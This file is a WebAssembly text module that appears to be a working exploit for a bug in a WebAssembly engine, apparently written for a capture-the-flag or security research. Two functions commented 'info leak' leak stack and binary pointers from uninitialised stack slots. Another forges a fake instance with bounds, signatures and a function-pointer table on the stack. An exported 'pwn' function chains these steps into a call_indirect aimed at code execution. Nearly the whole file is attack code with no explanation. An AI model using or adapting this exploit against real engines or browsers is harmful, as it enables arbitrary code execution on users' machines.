(module
  (type $type (func))
  (table 1 anyfunc)

  ;; info leak
  (func (result i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   ;; number of locals controls the stack offset of the leak

   local.get 0
   local.get 0
   local.get 0
   local.get 0
   local.get 0
   local.get 0
   local.get 0
   local.get 0

   (loop $my_loop
     i32.const 0
     br_if $my_loop
   )

   drop
   drop
   drop
   drop
   drop
   drop
   drop
  )

  ;; info leak
  (func (result i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   ;; number of locals controls the stack offset of the leak

   local.get 0
   local.get 0
   local.get 0
   local.get 0
   local.get 0
   local.get 0
   local.get 0
   local.get 0

   (loop $my_loop
     i32.const 0
     br_if $my_loop
   )

   drop
   drop
   drop
   drop
   drop
   drop
   drop
  )

  (func (param i64) (param i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)
   (local i64)

   ;; fake instance starts at local 80

   ;; bounds at 0x1c
   i64.const 0x100000000
   local.set 77

   ;; signatures at 0x48
   local.get 0
   i64.const 8
   i64.sub
   local.set 71

   ;; func signature
   i64.const 0x1234123433333333
   local.set 81

   ;; type1 at 0x38
   local.get 0
   i64.const 0x10
   i64.sub
   local.set 73

   ;; type2
   i64.const 0x2222222233333333
   local.set 82

   ;; fptr table at 0x40
   local.get 0
   i64.const 0x18
   i64.sub
   local.set 72

   ;;i64.const 0x5566778899
   local.get 1
   i64.const 0x1322514
   i64.add
   local.set 83

   call 3
  )

  (func)

  (func (param i32) (param i64)
    local.get 0                                         
    if                       
    (block     
      return                                          
    )
    end

    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    drop
    drop
    drop
    drop
    drop
    drop
    drop
    drop
    drop

    (loop $my_loop
      i32.const 0
      br_if $my_loop
    )

    i32.const 0
    call_indirect
  )

  (func (export "pwn")
    (local i64)
    (local i64)
    ;; leak stack ptr
    call 0
    i64.const 0x1f0
    i64.sub
    local.set 0

    ;; leak binary ptr
    call 1
    i64.const 0x13064f4
    i64.sub
    local.set 1

    ;; local0 = stackptr
    ;; local1 = binptr

    ;; compile fn
    i32.const 1
    i64.const 0x12345678
    call 4

    ;; setup stack
    local.get 0
    local.get 1
    call 2

    ;; code exec
    i32.const 0
    local.get 0
    i64.const 1
    i64.add
    call 4
  )
)
